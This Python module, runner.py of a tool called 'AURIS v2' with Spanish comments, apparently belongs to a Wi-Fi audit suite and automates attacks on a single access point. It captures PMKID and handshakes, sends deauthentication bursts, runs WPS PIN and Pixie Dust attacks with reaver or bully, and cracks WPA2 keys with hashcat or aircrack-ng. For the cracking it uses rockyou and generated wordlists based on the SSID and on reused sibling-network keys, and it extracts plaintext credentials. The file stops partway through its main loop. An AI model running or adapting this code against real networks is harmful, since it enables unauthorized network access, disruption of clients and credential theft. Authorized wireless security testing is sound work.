"""
AURIS v2 — runner.py
Motor de ejecución secuencial completo.

Flujo automático para UN target:
    AUTH → RECON → PROFILE → THREAT_MODEL → DECIDE →
    [CAPTURE / WPS / PSK / MGMT / EOL / VALIDATE / RESILIENCE] → REPORT

No hay interacción del usuario durante la ejecución.
Todo se decide antes de tocar el aire.
"""

import time
import os
import glob
import json
import uuid
import subprocess
import shutil
from datetime import datetime
from typing import Dict, Any, List, Optional

from .models import TargetInfo, Profile, AURISScore
from .decision_engine import decide_path, calculate_stride_threat
from .wids import WIDSSensor
from .terminal import (
    console, print_phase_start, print_phase_result,
    print_wids_alert, spinner,
)
from .reporter import Reporter

# ── Timeouts por fase (segundos) ─────────────────────────────────────────────
TIMEOUTS: Dict[str, int] = {
    "CAPTURE_HANDSHAKE": 120,
    "CAPTURE_PMKID":     60,
    "WPS_CLASS":         180,
    "WPS_PIXIE":         120,
    "PSK_SSID_LOGIC":    300,
    "PSK_ROCKYOU":       900,
    "MGMT_AUDIT":        60,
    "EOL_GOVERNANCE":    10,
    "RESILIENCE_TEST":   30,
    "VALIDATE_COUNTERMEASURE": 20,
    "CLASSIFY_WEAK_CRYPTO": 5,
}

MAX_ATTEMPTS: Dict[str, int] = {
    "CAPTURE_HANDSHAKE": 3,
    "CAPTURE_PMKID":     2,
    "WPS_CLASS":         1,
    "WPS_PIXIE":         1,
    "PSK_SSID_LOGIC":    2,
    "PSK_ROCKYOU":       1,
}

# Fases de ataque: una vez crackeado se omiten (wifite2 para la batería).
ATTACK_PHASES = {
    "CAPTURE_PMKID", "CAPTURE_HANDSHAKE", "WPS_CLASS", "WPS_PIXIE",
    "PSK_SSID_LOGIC", "PSK_ROCKYOU", "CLASSIFY_WEAK_CRYPTO",
}

# Salidas de reaver/bully que indican lockout o rate-limit del AP.
WPS_LOCKOUT_MARKERS = (
    "locked", "lockout", "rate limiting", "wps transaction failed",
    "too many", "nack", "0x02", "detected ap rate",
)


def _tool_available(name: str) -> bool:
    return shutil.which(name) is not None


def _run_tool_plain(cmd: List[str], timeout: int) -> Dict[str, Any]:
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "timed_out": False,
        }
    except subprocess.TimeoutExpired:
        return {"returncode": -1, "stdout": "", "stderr": "timeout", "timed_out": True}
    except FileNotFoundError:
        return {"returncode": -1, "stdout": "", "stderr": "tool_not_found", "timed_out": False}
    except Exception as e:
        return {"returncode": -1, "stdout": "", "stderr": str(e), "timed_out": False}


def _run_tool(cmd: List[str], timeout: int, desc: Optional[str] = None) -> Dict[str, Any]:
    """
    Ejecuta un subproceso con timeout.
    Con desc: muestra solo la barra de carga minimalista mientras trabaja.
    Retorna {"returncode", "stdout", "stderr", "timed_out"}
    """
    if not desc or os.environ.get("AURIS_NO_PROGRESS"):
        return _run_tool_plain(cmd, timeout)

    import threading
    from .terminal import live_task
    box: Dict[str, Any] = {}
    worker = threading.Thread(
        target=lambda: box.update(result=_run_tool_plain(cmd, timeout)),
        daemon=True,
    )
    worker.start()
    with live_task(desc, max(timeout, 1)) as tick:
        elapsed = 0.0
        while worker.is_alive() and elapsed < timeout:
            time.sleep(0.5)
            elapsed += 0.5
            tick(0.5)
    worker.join(timeout=3)
    return box.get("result", {"returncode": -1, "stdout": "", "stderr": "timeout", "timed_out": True})


# ──────────────────────────────────────────────────────────────────────────────
# Handlers de cada fase
# ──────────────────────────────────────────────────────────────────────────────

def _extract_reaver_credentials(text: str) -> Dict[str, str]:
    """Extrae WPS PIN y WPA PSK del stdout de reaver / bully / pixiewps."""
    import re
    creds = {}
    pin_m = re.search(r"(?:wps pin|pin)[:\s]+['\"]?(\d{4,8})['\"]?", text, re.IGNORECASE)
    if pin_m:
        creds["pin"] = pin_m.group(1)

    psk_m = re.search(r"(?:wpa psk|psk|key)[:\s]+['\"]?([^'\r\n]+)['\"]?", text, re.IGNORECASE)
    if psk_m:
        creds["psk"] = psk_m.group(1).strip()
    return creds


def _extract_hashcat_key(hash_path: str) -> Optional[str]:
    """Ejecuta hashcat --show para recuperar la contraseña en texto claro obtenida."""
    if not _tool_available("hashcat"):
        return None
    res = _run_tool(["hashcat", "-m", "22000", hash_path, "--show"], timeout=10)
    stdout = res.get("stdout", "").strip()
    if stdout:
        for line in stdout.splitlines():
            line = line.strip()
            if ":" in line:
                parts = line.split(":")
                if len(parts) >= 2 and parts[-1]:
                    return parts[-1]
    return None


def _parse_aircrack_key(text: str) -> Optional[str]:
    """Clave en claro desde la salida de aircrack-ng: 'KEY FOUND! [ clave ]'."""
    import re
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", text or "")
    return m.group(1).strip() if m else None


def _aircrack_cap(run_dir: str) -> Optional[str]:
    """
    Devuelve un .cap legible por aircrack-ng. Si la captura es pcapng (PMKID o
    handshake de hcxdumptool), lo reconstruye desde handshake.hc22000 con
    hcxhash2cap — así el crackeo funciona sin hashcat.
    """
    for pat in ("handshake*.cap", "wpa.cap", "*-01.cap", "*.cap", "*.pcap"):
        for cand in sorted(glob.glob(os.path.join(run_dir, pat))):
            try:
                if os.path.getsize(cand) > 24:  # cabecera pcap mínima
                    return cand
            except OSError:
                continue
    hash_path = os.path.join(run_dir, "handshake.hc22000")
    if os.path.isfile(hash_path) and _tool_available("hcxhash2cap"):
        out = os.path.join(run_dir, "reconstruido.cap")
        _run_tool(["hcxhash2cap", "-c", out, f"--pmkid-eapol={hash_path}"], timeout=20)
        try:
            if os.path.getsize(out) > 24:
                return out
        except OSError:
            pass
    return None


def _crack_with_aircrack(cap: str, wordlist: str, bssid: str,
                         timeout: int, desc: str) -> tuple[str, Optional[str]]:
    """
    Crackeo PSK con aircrack-ng: alternativa completamente offline cuando el
    sistema no tiene hashcat (Kali mínima, sin OpenCL).
    """
    result = _run_tool(
        ["aircrack-ng", "-w", wordlist, "-b", bssid, "-q", cap],
        timeout=timeout, desc=desc,
    )
    if result["timed_out"]:
        return "timeout", None
    key = _parse_aircrack_key(result.get("stdout", ""))
    if key:
        return "cracked", key
    return "exhausted", None


def _phase_classify_weak_crypto(target: TargetInfo) -> tuple[str, Optional[str], Optional[str]]:
    enc = target.encryption.upper()
    if enc in ("OPEN", "NONE"):
        console.print("  [red]Red Abierta sin contraseña — perímetro desprotegido.[/red]")
        return "cracked", "[Sin contraseña - Red Abierta]", "Red Abierta / Sin Cifrado"
    console.print(f"  [red]Cifrado débil detectado ({target.encryption}) — documentando sin exploit.[/red]")
    return "class_confirmed", None, f"Cifrado débil ({target.encryption})"


def _pcap_captured(path: str) -> bool:
    """Éxito real = archivo pcap existe y no está vacío (hcxdumptool escribe a archivo)."""
    try:
        return os.path.isfile(path) and os.path.getsize(path) > 0
    except OSError:
        return False


def _ensure_hc22000(run_dir: str) -> Optional[str]:
    """Convierte pcapng capturado a hc22000 con hcxpcapngtool. Retorna ruta o None."""
    hash_path = f"{run_dir}/handshake.hc22000"
    if os.path.isfile(hash_path) and os.path.getsize(hash_path) > 0:
        return hash_path
    if not _tool_available("hcxpcapngtool"):
        return None
    for src in (f"{run_dir}/handshake.pcapng", f"{run_dir}/pmkid.pcapng"):
        if _pcap_captured(src):
            res = _run_tool(["hcxpcapngtool", "-o", hash_path, src], timeout=30)
            if res["returncode"] == 0 and os.path.isfile(hash_path):
                return hash_path
    return None


def _aircrack_has_handshake(cap_path: str) -> Optional[bool]:
    """Verifica handshake real con aircrack-ng. None si no hay herramienta."""
    if not _tool_available("aircrack-ng") or not _pcap_captured(cap_path):
        return None
    res = _run_tool(["aircrack-ng", cap_path], timeout=30)
    out = (res.get("stdout", "") + res.get("stderr", "")).lower()
    if "handshake" in out:
        return True
    return False


def _deauth_burst(target: TargetInfo, iface: str, frames: int = 10) -> bool:
    """Ráfaga deauth broadcast (sin MACs de estación: el scan solo da conteo)."""
    if not _tool_available("aireplay-ng"):
        return False
    res = _run_tool(
        ["aireplay-ng", "--deauth", str(frames), "-a", target.bssid, iface],
        timeout=30,
        desc=f"Deauth ×{frames} · {target.ssid}",
    )
    return res["returncode"] == 0


def _airodump_round(target: TargetInfo, iface: str, run_dir: str,
                    seconds: int = 30, round_no: int = 1) -> bool:
    """Ronda airodump + deauth. True si hay handshake verificado o material útil."""
    import shutil as _sh
    prefix = f"{run_dir}/hs_r{round_no}"
    for f in (f"{prefix}-01.cap", f"{prefix}-01.csv"):
        try:
            os.remove(f)
        except OSError:
            pass
    try:
        proc = subprocess.Popen(
            ["airodump-ng", "-c", str(target.channel), "--bssid", target.bssid,
             "-w", prefix, "--output-format", "pcap", iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except (OSError, FileNotFoundError):
        return False
    try:
        time.sleep(min(10, seconds))
        _deauth_burst(target, iface)
        time.sleep(max(seconds - 10, 5))
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    cap = f"{prefix}-01.cap"
    verified = _aircrack_has_handshake(cap)
    if verified is True:
        try:
            _sh.copyfile(cap, f"{run_dir}/handshake.pcapng")
        except OSError:
            pass
        return True
    return _pcap_captured(cap)


def _phase_capture_pmkid(target: TargetInfo, iface: str, run_dir: str) -> str:
    """Batería PMKID: hasta N rondas cortas hasta material convertible."""
    pcap_path = f"{run_dir}/pmkid.pcapng"
    attempts = MAX_ATTEMPTS.get("CAPTURE_PMKID", 2)

    if not _tool_available("hcxdumptool"):
        console.print("  [yellow]hcxdumptool no disponible — omitiendo CAPTURE_PMKID[/yellow]")
        return "skipped"

    timeout = TIMEOUTS["CAPTURE_PMKID"] // attempts
    last = "not_found"
    for rnd in range(1, attempts + 1):
        result = _run_tool(
            ["hcxdumptool", "-i", iface, "--filterlist_ap", target.bssid,
             "--filtermode=2", "-o", pcap_path, f"--rcascan={timeout}"],
            timeout=timeout + 5,
            desc=f"Capturando PMKID {rnd}/{attempts} · {target.ssid}",
        )
        if _ensure_hc22000(run_dir) or _pcap_captured(pcap_path):
            return "captured"
        last = "timeout" if result["timed_out"] else ("error" if result["returncode"] != 0 else "not_found")
    return last


def _phase_capture_handshake(target: TargetInfo, iface: str, run_dir: str) -> str:
    """Batería autónoma de captura (wifite2): hcxdumptool y luego rondas
    airodump + deauth hasta handshake verificado o agotar intentos."""
    pcap_path = f"{run_dir}/handshake.pcapng"
    attempts = MAX_ATTEMPTS.get("CAPTURE_HANDSHAKE", 3)
    result: Dict[str, Any] = {}

    tools = [t for t in ("hcxdumptool", "airodump-ng") if _tool_available(t)]
    if not tools:
        console.print("  [yellow]sin hcxdumptool ni airodump-ng — omitiendo CAPTURE_HANDSHAKE[/yellow]")
        return "skipped"

    # Ronda 1: hcxdumptool pasivo (rápido, sin inyección)
    if "hcxdumptool" in tools:
        timeout = TIMEOUTS["CAPTURE_HANDSHAKE"] // 2
        result = _run_tool(
            ["hcxdumptool", "-i", iface, "--filterlist_ap", target.bssid,
             "--filtermode=2", "-o", pcap_path, f"--rcascan={timeout}"],
            timeout=timeout + 5,
            desc=f"Captura pasiva 1/{attempts} · {target.ssid}",
        )
        if _ensure_hc22000(run_dir):
            return "captured"
        if _pcap_captured(pcap_path):
            return "captured"

    # Rondas 2..N: airodump + deauth (requiere inyección; solo con scope firmado)
    if "airodump-ng" in tools and _tool_available("aireplay-ng"):
        used = 1 if "hcxdumptool" in tools else 0
        for rnd in range(used + 1, attempts + 1):
            console.print(f"  [dim]Ronda {rnd}/{attempts}: airodump + deauth[/dim]")
            if _airodump_round(target, iface, run_dir, seconds=30, round_no=rnd):
                if _ensure_hc22000(run_dir):
                    return "captured"
                return "captured"
        return "not_found" if _tool_available("airodump-ng") else "timeout"

    if result.get("timed_out"):
        return "timeout"
    return "not_found" if _pcap_captured(pcap_path) is False else "captured"


def _phase_wps_class(target: TargetInfo, iface: str) -> tuple[str, Optional[str], Optional[str]]:
    """Valida la clase WPS con reaver/bully (pixie dust + pin class)."""
    timeout = TIMEOUTS["WPS_CLASS"]

    if not _tool_available("reaver") and not _tool_available("bully"):
        console.print("  [yellow]reaver/bully no disponibles — WPS_CLASS degradado[/yellow]")
        return "skipped", None, None

    tool = "reaver" if _tool_available("reaver") else "bully"

    result = _run_tool(
        [tool, "-i", iface, "-b", target.bssid, "-K", "1", "-v"],
        timeout=timeout,
        desc=f"WPS clase PIN · {target.ssid}",
    )

    if result["timed_out"]:
        return "timeout", None, None
    out_low = (result["stdout"] + result["stderr"]).lower()
    if any(m in out_low for m in WPS_LOCKOUT_MARKERS):
        return "locked", None, None
    if "pin" in result["stdout"].lower() and "found" in result["stdout"].lower():
        creds = _extract_reaver_credentials(result["stdout"])
        pin = creds.get("pin")
        psk = creds.get("psk")
        val = f"PIN: {pin} | PSK: {psk}" if psk and pin else (f"PIN: {pin}" if pin else (psk or "PIN de clase predecible detectado"))
        return "class_confirmed", val, "WPS PIN (Clase conocida)"
    return "not_found", None, None


def _phase_wps_pixie(target: TargetInfo, iface: str) -> tuple[str, Optional[str], Optional[str]]:
    """Pixie Dust WPS (solo WPS v1). reaver -K 1 (usa pixiewps) o bully -d."""
    timeout = TIMEOUTS["WPS_PIXIE"]
    if _tool_available("reaver"):
        cmd = ["reaver", "-i", iface, "-b", target.bssid, "-K", "1", "-S", "-v"]
        motor = "reaver"
    elif _tool_available("bully"):
        # bully implementa pixie dust con -d (también requiere pixiewps)
        cmd = ["bully", "-b", target.bssid, "-d", "-c", str(target.channel), iface]
        motor = "bully"
    else:
        return "skipped", None, None

    if not _tool_available("pixiewps"):
        console.print("  [yellow]pixiewps ausente — el ataque Pixie Dust no puede completarse[/yellow]")

    result = _run_tool(
        cmd,
        timeout=timeout,
        desc=f"WPS Pixie Dust ({motor}) · {target.ssid}",
    )
    if result["timed_out"]: return "timeout", None, None
    out_low = (result["stdout"] + result["stderr"]).lower()
    if any(m in out_low for m in WPS_LOCKOUT_MARKERS):
        return "locked", None, None
    if "wps pin" in result["stdout"].lower() or "wpa psk" in result["stdout"].lower():
        creds = _extract_reaver_credentials(result["stdout"])
        pin = creds.get("pin")
        psk = creds.get("psk")
        val = f"PIN: {pin} | PSK: {psk}" if psk and pin else (f"PIN: {pin}" if pin else (psk or "PIN/PSK recuperado"))
        return "cracked", val, "WPS Pixie Dust"
    return "not_found", None, None


def extract_reusable_psk(recovered_key: Optional[str]) -> Optional[str]:
    """Extrae la parte PSK reutilizable de una credencial ('PIN: x | PSK: y' → 'y')."""
    if not recovered_key:
        return None
    import re
    m = re.search(r"PSK\s*:\s*([^|]+)", recovered_key, re.IGNORECASE)
    if m:
        return m.group(1).strip().strip("'\"")
    if "PIN:" in recovered_key.upper():
        return None
    return recovered_key.strip()


def ssid_family_base(ssid: str) -> str:
    """Base de familia: quita sufijos de AP hermano (_2, -3, _5G, _PLUS, _EXT, ...)."""
    import re
    base = (ssid or "").strip()
    m = re.search(r"(?i)([ _.\-]?(2|3|4|5|plus|5g|2g|ext|guest|iot|2\.4g))$", base)
    if m and len(base) - len(m.group(0)) >= 3:
        return base[: -len(m.group(0))]
    return base


def _mutate_family_key(key: str) -> List[str]:
    """Mutaciones de una clave de AP hermano (caso X='wifi@2026@' → X2='wifi@2026@1/2')."""
    import re
    out: List[str] = []
    for t in ("1", "2", "3", "12", "123", "2024", "2025", "2026", "_1", "-1", "!", "@1"):
        out.append(f"{key}{t}")
    m = re.search(r"(\d+)([^0-9]*)$", key)
    if m:
        digits, tail = m.group(1), m.group(2)
        for d in ("1", "2", "3"):
            if d != digits:
                out.append(key[: m.start(1)] + d + tail)
        try:
            out.append(key[: m.start(1)] + str(int(digits) + 1) + tail)
        except ValueError:
            pass
    return out


def generate_ssid_candidates(
    ssid: str,
    bssid: Optional[str] = None,
    family_keys: Optional[Dict[str, str]] = None,
    max_candidates: int = 5000,
) -> tuple[List[str], List[str]]:
    """Genera (lote1, lote2) de candidatos PSK por lógica de SSID.

    lote1 = claves exactas reutilizadas de APs hermanos + variantes base del SSID.
    lote2 = mutaciones de claves de hermanos (reintento: X='wifi@2026@' → 'wifi@2026@1').
    Solo claves de SSIDs de la misma familia (misma base) para no contaminar.
    """
    ssid = (ssid or "").strip()
    my_base = ssid_family_base(ssid).lower()

    # Claves exactas de hermanos (reutilización directa: X2 suele repetir clave de X)
    exact: List[str] = []
    if family_keys:
        for sib_ssid, key in family_keys.items():
            if not key or len(key) < 8 or sib_ssid == ssid:
                continue
            if ssid_family_base(sib_ssid).lower() != my_base:
                continue
            if key not in exact:
                exact.append(key)

    bases: List[str] = []
    for b in (ssid, ssid_family_base(ssid)):
        if b and b not in bases:
            bases.append(b)
    case_forms: List[str] = []
    for b in bases:
        for v in (b, b.lower(), b.upper(), b.capitalize()):
            if v not in case_forms:
                case_forms.append(v)

    years = [str(y) for y in range(2018, 2027)]
    tails = ["1", "2", "3", "01", "02", "123", "1234", "12345",
             "007", "000", "111", "999",
             "wifi", "admin", "internet", "casa", "hogar", "router"]
    try:
        from .vendor_profiles import ISP_TOKENS
        tails = tails + [t for t in ISP_TOKENS if t not in tails]
    except ImportError:
        pass
    seps = ["", "_", "-", ".", "@"]

    lote1: List[str] = list(exact)

    def add(lst: List[str], c: str):
        if c and len(c) >= 8 and c not in lote1 and c not in lst and len(lote1) + len(lst) < max_candidates:
            lst.append(c)

    base_part: List[str] = []
    for base in case_forms:
        add(base_part, base)
        for sep in seps:
            for tail in tails + years:
                add(base_part, f"{base}{sep}{tail}")
        for y in years:  # patrón '@año@' típico de PSK de operadora
            add(base_part, f"{base}@{y}@")
            add(base_part, f"{base}#{y}")
    lote1.extend(base_part)
    for generic in ("password", "12345678", "87654321", "admin1234", "wifi1234", "qwerty123"):
        if generic not in lote1:
            lote1.append(generic)

    if bssid:
        frags = {bssid.replace(":", "").replace("-", "").upper()[-6:],
                 bssid.replace(":", "").replace("-", "").upper()[-4:]}
        for frag in frags:
            if not frag:
                continue
            for v in (frag, frag.lower()):
                for base in case_forms[:2]:
                    for c in (f"{base}{v}", f"{base}_{v}"):
                        if len(c) >= 8 and c not in lote1 and len(lote1) < max_candidates:
                            lote1.append(c)

    # lote2: mutaciones (solo si hay claves de hermanos)
    lote2: List[str] = []
    if family_keys:
        for sib_ssid, key in family_keys.items():
            if not key or len(key) < 4 or sib_ssid == ssid:
                continue
            if ssid_family_base(sib_ssid).lower() != my_base:
                continue
            for m in _mutate_family_key(key):
                if len(m) >= 8 and m not in lote1 and m not in lote2:
                    lote2.append(m)

    return lote1, lote2


def _phase_psk_ssid_logic(
    target: TargetInfo, run_dir: str,
    family_keys: Optional[Dict[str, str]] = None,
) -> tuple[str, Optional[str], Optional[str]]:
    """Ataca PSK offline: lote1 (SSID+reutilización) y reintento lote2 (mutaciones familia)."""
    wl1 = f"{run_dir}/ssid_wordlist.txt"
    wl2 = f"{run_dir}/ssid_wordlist_familia.txt"

    lote1, lote2 = generate_ssid_candidates(target.ssid, target.bssid, family_keys)

    with open(wl1, "w") as f:
        f.write("\n".join(lote1))

    n_fam = sum(1 for c in lote1 if family_keys and c in (family_keys or {}).values())
    console.print(f"  [dim]Wordlist SSID lógica → {len(lote1)} candidatos ({n_fam} por reutilización de familia)[/dim]")

    hash_path = _ensure_hc22000(run_dir) or f"{run_dir}/handshake.hc22000"

    if not _tool_available("hashcat"):
        # Sin hashcat (Kali mínima sin OpenCL): aircrack-ng con los mismos lotes.
        cap = _aircrack_cap(run_dir) if _tool_available("aircrack-ng") else None
        if not cap:
            console.print("  [yellow]Sin hashcat ni .cap utilizable — PSK_SSID_LOGIC degradado[/yellow]")
            return "skipped", None, None
        console.print("  [dim]hashcat ausente → crackeando con aircrack-ng (offline)[/dim]")
        with open(wl1, "w") as f:
            f.write("\n".join(lote1))
        r, key = _crack_with_aircrack(
            cap, wl1, target.bssid, min(120, TIMEOUTS["PSK_SSID_LOGIC"]),
            f"aircrack-ng {len(lote1)} claves · {target.ssid}",
        )
        if r == "cracked":
            return "cracked", key, "WPA2-PSK (Lógica SSID, aircrack-ng)"
        if r == "exhausted" and lote2:
            with open(wl2, "w") as f:
                f.write("\n".join(lote2))
            r2, key2 = _crack_with_aircrack(
                cap, wl2, target.bssid, 60,
                f"aircrack-ng {len(lote2)} variantes · {target.ssid}",
            )
            if r2 == "cracked":
                return "cracked", key2, "WPA2-PSK (Lógica SSID familia, aircrack-ng)"
        return r, None, None

    if not os.path.isfile(hash_path):
        console.print("  [yellow]No hay hash capturado — ejecutar CAPTURE primero[/yellow]")
        return "skipped", None, None

    budget = TIMEOUTS["PSK_SSID_LOGIC"]
    t1 = min(120, budget)

    def _try(wordlist: List[str], wl_path: str, timeout: int, label: str):
        with open(wl_path, "w") as f:
            f.write("\n".join(wordlist))
        result = _run_tool(
            ["hashcat", "-m", "22000", hash_path, wl_path, "--quiet", "--status"],
            timeout=timeout,
            desc=f"Probando {len(wordlist)} claves · {target.ssid}",
        )
        if result["timed_out"]:
            return "timeout", None, None
        if result["returncode"] == 0:
            key = _extract_hashcat_key(hash_path) or f"Recuperada en {label}"
            return "cracked", key, f"WPA2-PSK ({label})"
        return "exhausted", None, None

    r, key_val, type_val = _try(lote1, wl1, t1, "Lógica SSID")
    if r == "cracked":
        return r, key_val, type_val

    attempts = MAX_ATTEMPTS.get("PSK_SSID_LOGIC", 2)
    if r == "exhausted" and lote2 and attempts > 1:
        console.print(f"  [dim]Reintento 2/{attempts} con {len(lote2)} variantes de familia...[/dim]")
        return _try(lote2, wl2, max(budget - t1, 30), "Lógica SSID familia")

    return r, None, None


def _phase_psk_rockyou(target: TargetInfo, run_dir: str) -> tuple[str, Optional[str], Optional[str]]:
    """Ataca PSK con rockyou.txt (del sistema o del bundle offline)."""
    from .wordlists import find_rockyou
    from .roe import PROJECT_DIR as _PROJECT_DIR
    rockyou = find_rockyou(_PROJECT_DIR) or "/usr/share/wordlists/rockyou.txt"
    if not rockyou or not os.path.isfile(rockyou):
        console.print("  [yellow]rockyou.txt no disponible — omitiendo PSK_ROCKYOU[/yellow]")
        return "skipped", None, None

    hash_path = _ensure_hc22000(run_dir) or f"{run_dir}/handshake.hc22000"

    if not _tool_available("hashcat"):
        # Sin hashcat: diccionario con aircrack-ng (offline, sin OpenCL).
        cap = _aircrack_cap(run_dir) if _tool_available("aircrack-ng") else None
        if not cap:
            return "skipped", None, None
        console.print("  [dim]hashcat ausente → rockyou con aircrack-ng (offline)[/dim]")
        r, key = _crack_with_aircrack(
            cap, rockyou, target.bssid, TIMEOUTS["PSK_ROCKYOU"],
            f"aircrack-ng rockyou · {target.ssid}",
        )
        if r == "cracked":
            return "cracked", key, "WPA2-PSK (Diccionario, aircrack-ng)"
        return r, None, None

    if not os.path.isfile(hash_path):
        return "skipped", None, None

    result = _run_tool(
        ["hashcat", "-m", "22000", hash_path, rockyou, "--quiet", "--status", "--status-timer=30"],
        timeout=TIMEOUTS["PSK_ROCKYOU"],
        desc=f"Diccionario rockyou · {target.ssid}",
    )
    if result["timed_out"]: return "timeout", None, None
    if result["returncode"] == 0:
        key = _extract_hashcat_key(hash_path) or "Recuperada en rockyou.txt"
        return "cracked", key, "WPA2-PSK (Diccionario)"
    return "exhausted", None, None


def _phase_audit_dpp(target: TargetInfo, profile: Profile, run_dir: str) -> str:
    """Evalúa onboarding DPP por señales observables (transición, WPS, flota)."""
    from .vendor_profiles import dpp_assessment
    a = dpp_assessment(profile.brand, target.ssid,
                       wpa3_supported=target.wpa3_supported,
                       dpp_supported=target.dpp_supported,
                       wps_enabled=target.wps_enabled,
                       encryption=target.encryption)
    try:
        with open(f"{run_dir}/dpp_assessment.json", "w") as f:
            json.dump(a, f, indent=2)
    except OSError:
        pass
    for s in a["signals"]:
        mark = {"ok": "green", "warn": "yellow", "risk": "red"}[s["status"]]
        console.print(f"  [{mark}]DPP/{s['signal']}:[/{mark}] {s['status']}")
    return {"clear": "done", "needs_evidence": "not_found", "concern": "not_found"}[a["verdict"]]


def _phase_eol_governance(target: TargetInfo, profile: Profile, run_dir: str) -> str:
    """Evalúa brecha de firmware contra la base EOL local (por flota, sin internet)."""
    from .vendor_profiles import eol_assessment
    a = eol_assessment(profile.brand, target.ssid)
    try:
        with open(f"{run_dir}/eol_assessment.json", "w") as f:
            json.dump(a, f, indent=2)
    except OSError:
        pass
    if a["verdict"] == "eol_confirmed":
        console.print(f"  [red]Hallazgo EOL ({a['brand']}):[/red] {a['reasons'][0]}")
        console.print(f"  [dim]Acción: {a['action']}[/dim]")
        return "eol_confirmed"
    console.print(f"  [dim]EOL {a['brand']}: se requiere evidencia ({a['required_evidence'][0]})[/dim]")
    return "not_found"


def _phase_resilience_test(target: TargetInfo, iface: str) -> str:
    """Envía frames de deauth y mide tiempo de recuperación del AP."""
    if not _tool_available("aireplay-ng"):
        console.print("  [yellow]aireplay-ng no disponible — resiliencia degradada[/yellow]")
        return "skipped"
    result = _run_tool(
        ["aireplay-ng", "--deauth", "5", "-a", target.bssid, iface],
        timeout=30,
        desc=f"Prueba de resiliencia · {target.ssid}",
    )
    return "done" if result["returncode"] == 0 else "error"


def _phase_audit_lan_surface(target: TargetInfo, run_dir: str,
                             scope: Optional[Dict], allow_lan: bool) -> str:
    """Superficie LAN del gateway (solo lectura). Requiere --allow-lan + gateway en scope."""
    gw = (scope or {}).get("lab_lan_gateway", "") or ""
    if not allow_lan or not gw:
        return "skipped"
    from .lan_audit import audit_lan_surface
    try:
        data = audit_lan_surface(gw)
    except ValueError as e:
        console.print(f"  [red][LAN][/red] {e}")
        return "error"
    except Exception as e:
        console.print(f"  [yellow][LAN] gateway {gw} inalcanzable ({e})[/yellow]")
        return "error"
    try:
        with open(f"{run_dir}/lan_surface.json", "w") as f:
            json.dump(data, f, indent=2)
    except OSError:
        pass
    console.print(f"  [dim]LAN {gw}: {data['summary']}[/dim]")
    for c in data["checks"]:
        if c["open"] and c.get("finding"):
            console.print(f"  [yellow]◉ {c['port']}/{c['service']}[/yellow] → {c['finding']}")
    return "done"


# ──────────────────────────────────────────────────────────────────────────────
# Orquestador principal
# ──────────────────────────────────────────────────────────────────────────────

def run_single_target(
    target: TargetInfo,
    profile: Profile,
    iface: str = "wlan0",
    wids_iface: Optional[str] = None,
    scope: Optional[Dict] = None,
    known_keys: Optional[Dict[str, str]] = None,
    allow_lan: bool = False,
) -> Dict[str, Any]:
    """
    Ejecuta la secuencia completa para UN target.
    known_keys: {ssid: psk} ya recuperadas en la sesión (reutilización familia).
    Retorna un dict con los resultados de la run, incluyendo credenciales si fueron obtenidas.
    """
    import os

    run_id = str(uuid.uuid4())[:8]
    from .roe import evidence_dir
    run_dir = evidence_dir(run_id)
    os.makedirs(run_dir, exist_ok=True)
    t_start = time.time()

    # Iniciar WIDS en paralelo si hay segunda interfaz
    sensor = WIDSSensor(interface=wids_iface or "wlan1")
    wids_active = wids_iface is not None
    if wids_active:
        sensor.set_alert_callback(print_wids_alert)
        sensor.start()

    # Modelo STRIDE
    stride = calculate_stride_threat(target, profile)

    # Decidir path
    path = decide_path(
        target, profile,
        wids_enabled=wids_active,
        dry_run=False,
    )
    # Remover marcador interno
    path = [p for p in path if p != "START_WIDS_MONITORING"]

    phase_results: Dict[str, str] = {}
    final_result = "pending"
    recovered_key: Optional[str] = None
    key_type: Optional[str] = None

    # Ejecutar cada fase en orden
    for phase in path:
        if phase == "REPORT":
            break
        # Batería autónoma: crackeado => se omiten los vectores restantes
        if final_result == "cracked" and phase in ATTACK_PHASES:
            phase_results[phase] = "skipped"
            print_phase_result(phase, "skipped", detail="batería detenida: credencial ya obtenida")
            continue

        print_phase_start(phase, target.bssid, target.ssid)
        key_val: Optional[str] = None
        type_val: Optional[str] = None

        try:
            if phase == "CLASSIFY_WEAK_CRYPTO":
                r, key_val, type_val = _phase_classify_weak_crypto(target)

            elif phase == "CAPTURE_PMKID":
                r = _phase_capture_pmkid(target, iface, run_dir)

            elif phase == "CAPTURE_HANDSHAKE":
                r = _phase_capture_handshake(target, iface, run_dir)

            elif phase == "WPS_CLASS":
                r, key_val, type_val = _phase_wps_class(target, iface)
                if r == "locked":
                    console.print("  [yellow]AP en lockout — deteniendo path aéreo[/yellow]")
                    final_result = "locked"
                    phase_results[phase] = r
                    break

            elif phase == "WPS_PIXIE":
                r, key_val, type_val = _phase_wps_pixie(target, iface)

            elif phase == "PSK_SSID_LOGIC":
                r, key_val, type_val = _phase_psk_ssid_logic(target, run_dir, family_keys=known_keys)

            elif phase == "PSK_ROCKYOU":
                r, key_val, type_val = _phase_psk_rockyou(target, run_dir)

            elif phase == "EOL_GOVERNANCE":
                r = _phase_eol_governance(target, profile, run_dir)

            elif phase == "AUDIT_LAN_SURFACE":
                r = _phase_audit_lan_surface(target, run_dir, scope, allow_lan)

            elif phase == "RESILIENCE_TEST":
                r = _phase_resilience_test(target, iface)

            elif phase == "VALIDATE_COUNTERMEASURE":
                console.print("  [dim]Validación de contramedidas — registrado.[/dim]")
                r = "done"
                
            elif phase == "DETECT_WPS_LOCKOUT":
                console.print("  [green]Configuración defensiva detectada: WPS Lockout activo.[/green]")
                r = "locked"
                
            elif phase == "DETECT_WPA3_SAE":
                console.print("  [green]WPA3 SAE detectado. Omitiendo diccionario offline (resistente por diseño).[/green]")
                r = "done"
                
            elif phase == "AUDIT_DPP_VULNERABILITIES":
                r = _phase_audit_dpp(target, profile, run_dir)

            else:
                console.print(f"  [dim]Fase {phase} no implementada aún.[/dim]")
                r = "skipped"

        except Exception as exc:
            console.print(f"  [red]ERROR en {phase}: {exc}[/red]")
            r = "error"

        if key_val:
            recovered_key = key_val
            key_type = type_val
